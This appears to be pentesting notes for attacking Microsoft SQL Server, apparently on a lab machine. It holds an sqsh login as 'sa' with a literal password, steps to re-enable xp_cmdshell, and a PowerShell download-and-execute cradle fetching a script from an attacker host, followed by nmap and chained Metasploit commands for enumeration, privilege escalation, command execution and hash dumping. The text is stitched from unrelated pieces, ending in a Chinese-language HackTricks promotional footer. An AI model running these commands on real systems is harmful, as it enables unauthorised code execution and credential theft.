#sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G

###the goal is to get xp_cmdshell working###
1. try and see if it works
xp_cmdshell `whoami`
go

2. try to turn component back on
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell `whoami`
go

3. 'advanced' turn it back on
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell 'whoami'
go




xp_cmdshell "powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/ye443.ps1')"


https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server

Entry_2:
Name: Nmap for SQL
Description: Nmap with SQL Scripts
Command: nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}

Entry_3:
Name: MSSQL consolesless mfs enumeration
Description: MSSQL enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use admin/mssql/mssql_enum_domain_accounts; set RHOSTS {IP}; set RPORT <PORT>; run; exit' &&msfconsole -q -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS {IP}; set RPORT <PORT>; run; exit'

```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在 HackTricks 中**宣传你的公司**吗？或者你想要**获取最新版本的 PEASS 或下载 HackTricks 的 PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**推特**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
